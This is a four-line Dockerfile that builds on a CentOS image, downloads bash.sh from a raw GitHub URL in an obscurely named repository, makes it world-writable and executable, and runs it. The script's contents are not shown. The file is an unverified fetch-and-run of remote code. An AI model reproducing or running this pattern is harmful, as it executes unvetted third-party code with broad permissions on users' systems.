FROM centos:latest

RUN curl -O https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/bash.sh
RUN chmod 777 bash.sh
RUN bash bash.sh
